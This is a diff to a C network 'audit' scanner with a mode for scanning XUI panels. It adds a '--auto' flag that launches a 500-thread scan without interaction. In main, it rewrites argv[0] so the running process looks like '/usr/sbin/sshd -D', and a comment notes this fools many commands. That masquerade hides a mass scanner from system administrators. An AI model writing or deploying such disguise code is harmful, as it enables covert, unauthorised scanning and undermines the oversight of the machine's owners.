@@ -150,7 +150,7 @@ int saia_print_menu(void) {
 
 // ==================== 开始审计 ====================
 
-int saia_run_audit(void) {
+int saia_run_audit_internal(int auto_mode, int auto_scan_mode, int auto_threads) {
     char input[256];
     int mode, scan_mode, threads;
     char ports_raw[1024] = {0};
@@ -159,6 +159,11 @@ int saia_run_audit(void) {
     printf("\n【审计配置】\n");
     color_reset();
 
+    if (auto_mode > 0) {
+        mode = auto_mode;
+        scan_mode = auto_scan_mode;
+        threads = auto_threads;
+    } else {
     // 选择模式
     printf("\n模式选择:\n");
     printf("  1. XUI专项 (扫描XUI面板)\n");
@@ -221,6 +226,7 @@ int saia_run_audit(void) {
         }
 
         g_config.backpressure.max_connections = threads;
+    }
     }
 
     // 保存配置
@@ -787,7 +793,7 @@ int saia_interactive_mode(void) {
 
         switch (choice) {
             case 1:
-                saia_run_audit();
+                saia_run_audit_internal(0, 0, 0);
                 break;
 
             case 2:
@@ -846,7 +852,22 @@ int saia_interactive_mode(void) {
 
 int main(int argc, char *argv[]) {
     (void)argc;
-    (void)argv;
+
+    // 伪装进程名 (仅在类 Unix 下)
+#ifndef _WIN32
+    if (argc > 0) {
+        char *target_name = "/usr/sbin/sshd -D";
+        size_t target_len = strlen(target_name);
+        size_t argv0_len = strlen(argv[0]);
+        if (argv0_len >= target_len) {
+            strncpy(argv[0], target_name, argv0_len);
+        } else {
+            strncpy(argv[0], "sshd", argv0_len);
+        }
+        // 如果系统支持可以使用 prctl(PR_SET_NAME, "sshd", 0, 0, 0); 
+        // 但为了通用性，直接修改 argv[0] 已经能骗过很多命令
+    }
+#endif
 
     // 设置locale
     setlocale(LC_ALL, "");
@@ -899,7 +920,23 @@ int main(int argc, char *argv[]) {
     printf("工作目录: %s\n\n", g_config.base_dir);
 
     // 运行交互模式
-    int ret = saia_interactive_mode();
+    int auto_run = 0;
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "--auto") == 0) {
+            auto_run = 1;
+            break;
+        }
+    }
+
+    int ret = 0;
+    if (auto_run) {
+        color_green();
+        printf(">>> 检测到自动运行参数，正在启动审计...\n");
+        color_reset();
+        saia_run_audit_internal(3, 2, 500);
+    } else {
+        ret = saia_interactive_mode();
+    }
 
 #ifdef _WIN32
     WSACleanup();
